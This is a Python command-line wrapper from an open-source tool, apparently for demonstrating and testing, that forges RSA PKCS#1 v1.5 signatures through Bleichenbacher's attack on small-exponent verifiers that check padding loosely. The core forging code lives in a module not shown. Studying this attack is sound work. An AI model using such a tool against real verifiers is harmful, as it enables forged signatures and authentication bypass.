#! /usr/bin/env python3

"""
This module gets parameters from the command line and
passes them to a method of the "SignatureForger" class
from the "SignatureForger.py".


This file is part of Bleichenbacher Signature Forger v2.0.

Copyright 2016 Filippo Valsorda
Copyright 2017 Peter Hoeg Steffensen
Copyright 2021 Maxim Masiutin

History:

1.0 (July 2nd, 2017)
  - Initial version

2.0 (May 5th, 2021)
  - Ported to Python 3
  - Removed strings in favor of byte objects
  - Added support for output formats
  - Added support for the public exponent command line parameter.
  - Dynamic precision adjustment for larger numbers
  - The program exits with an appropriate message if it cannot generate a signature, rather than spinning in an endless loop
  - The option to specify the number of FF's
  - The "quiet" option
  - All error messages are printed to stderr
  - Approprite exit codes returned
  - Added module docstrings
  - Proper "import" declarations that list only classes/functions which are actually imported
  - Added support for the SHA-224 hash
  - Implemented automatic unit tests


Bleichenbacher Signature Forger is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

Bleichenbacher Signature Forger is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Bleichenbacher Signature Forger.  If not, see <https://www.gnu.org/licenses/>.
"""

from argparse import ArgumentParser
from sys import stdout, stderr, argv, exit
from HashInfo import HASH_ASN1
from SignatureForger import SignatureForger, toInt
from base64 import b64encode
from binascii import hexlify

DefaultPublicExponent = 3
DefaultFFcount = 1
DefaultQuiet = False
DefaultOutputFormat = "base64"


def printOutput(arg_signature, arg_format, arg_quiet):

    if not arg_quiet:
        print("****************************************************")
        print("*         Signature successfully generated!        *")
        print("****************************************************")
        print("")
        print("Signature:")

    binary_data = None
    if arg_format == "base64":
        binary_data = b64encode(arg_signature)
    elif arg_format == "hex":
        binary_data = hexlify(arg_signature)
    elif arg_format == "raw":
        stdout.buffer.write(arg_signature)
    elif arg_format == "decimal":
        print(toInt(arg_signature))
    else:
        print("Unknown output format specified " + arg_format, file=stderr)

    if binary_data is not None:
        print(binary_data.decode("ascii"))


def getArguments():
    parser = ArgumentParser(
        description="Bleichenbacher Signature Forger. "
        + "Version 2.0. "
        + "This program demonstrates the vulenrability of the RSA PKCS1v1.5 and the attack when public exponent is small (e.g., 3) and the verification algorithm is not implemented properly."
    )

    parser.add_argument("-k", "--keysize", type=int, required=True)
    parser.add_argument(
        "-ha",
        "--hashalg",
        action="store",
        type=str,
        choices=list(HASH_ASN1.keys()),
        required=True,
    )
    parser.add_argument(
        "-va",
        "--variant",
        type=int,
        choices=[1, 2],
        help="1 - 00 01 FF ... 00 ASN.1 HASH GarbageWithZeros;  2 - 00 01 FF NonzeroGarbage 00 ASN.1 HASH",
        required=True,
    )
    parser.add_argument(
        "-of",
        "--outputformat",
        type=str,
        choices=["decimal", "hex", "base64", "raw"],
        default=DefaultOutputFormat,
    )
    parser.add_argument("-m", "--message", type=str, required=True)
    parser.add_argument(
        "-e", "--public-exponent", type=int, default=DefaultPublicExponent
    )
    parser.add_argument("-F", "--ffcount", type=int, default=DefaultFFcount)
    parser.add_argument("-q", "--quiet", action="store_true")

    if len(argv) == 1:
        parser.print_help(stderr)
        exit(1)

    ret_args = parser.parse_args()

    return ret_args


args = getArguments()

quiet = args.quiet

if quiet is None:
    quiet = DefaultQuiet

keySize = args.keysize
hashAlg = args.hashalg
ffcount = args.ffcount
if ffcount is None:
    ffcount = DefaultFFcount

public_exponent = args.public_exponent
if public_exponent is None:
    public_exponent = DefaultPublicExponent

if public_exponent is None:
    public_exponent = DefaultPublicExponent

if keySize is None:
    print("Please specify the key size", file=stderr)
    exit(1)

signatureForger = SignatureForger(keySize, hashAlg, public_exponent, ffcount, quiet)

signature = None

if args.variant == 1:
    signature = signatureForger.forgeSignature_method_garbage_end(args.message)
elif args.variant == 2:
    signature = signatureForger.forgeSignature_method_garbage_mid(args.message)
else:
    print(
        "Unsupported signature method. Choose '--variant 1' or '--variant 2'",
        file=stderr,
    )
    exit(1)

of = args.outputformat
if of is None:
    of = DefaultOutputFormat
if signature is None:
    print("Cannot generate the signature.", end="", file=stderr)
    if (public_exponent <= 3) and (keySize < 4096):
        print(" (Key size is too small?)", end="", file=stderr)
    print("", file=stderr)
    exit(2)
else:
    printOutput(signature, of, quiet)
